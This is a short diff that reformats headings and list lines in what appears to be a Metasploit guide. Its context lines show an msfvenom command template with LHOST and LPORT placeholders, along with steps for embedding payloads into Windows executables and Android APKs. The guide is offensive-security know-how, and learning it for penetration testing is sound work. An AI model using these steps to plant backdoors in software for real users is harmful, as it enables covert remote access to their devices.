@@ -53,7 +53,7 @@ msfvenom -p [payload] -f [format] LHOST=[your_IP] LPORT=[port] -o [output_filena
 ```
 # Embedding Payloads to exe, APK
 
-Embedding into Windows Executable (exe)
+### Embedding into Windows Executable (exe)
 
 You can embed a payload into an exe file using the following steps:
 
@@ -68,5 +68,5 @@ Replace [existing_exe] with the path to the existing exe file.
 
 Embedding into an APK involves using the Metasploit resource script.
 
-    Generate the payload.
-    Create a resource script (e.g., embed.rc) with the following:
+Generate the payload.
+Create a resource script (e.g., embed.rc) with the following:
